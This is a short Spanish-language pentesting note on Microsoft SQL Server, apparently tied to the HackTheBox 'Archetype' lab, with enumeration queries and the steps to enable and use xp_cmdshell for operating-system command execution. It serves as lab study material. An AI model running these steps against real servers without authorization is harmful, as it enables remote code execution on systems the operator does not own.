# Microsoft SQL Server

Es un servicio de base de datos que suele correr en el puerto 1433 (TCP). Este servicio se explota en [[Archetype HTB]].

Para más info consultar:

- [HACKTRICKS](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
- [PENTEST MONKEY](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

## Conexión

Para la conexión desde linux, utilizaremos un script de [[impacket]], llamado `mssqlclient.py`.

## Comandos útiles

```sql
# Get version
select @@version;

# Get user
select user_name();

#Check admin privileges
SELECT is_srvrolemember('sysadmin');
```

## Ejecución de comandos

Para ejecutar comandos a nivel de sistema haremos uso de `xp_cmdshell`, pero primero debemos asegurar que tenemos un usuario privilegiado y que la opción se encuentra habilitada. Lo primero lo hemos explicado en puntos anteriores, pero para comprobar si tenemos *xp_cmdshell* activado ejecutaremos:

```sql
EXEC xp_cmdshell 'net user';
```

En caso de tenerlo deshabilitado, lo habilitaremos de la siguiente manera:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; -- Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Una vez configurado podemos ejecutar comandos con:

```sql
xp_cmdshell "comando";
```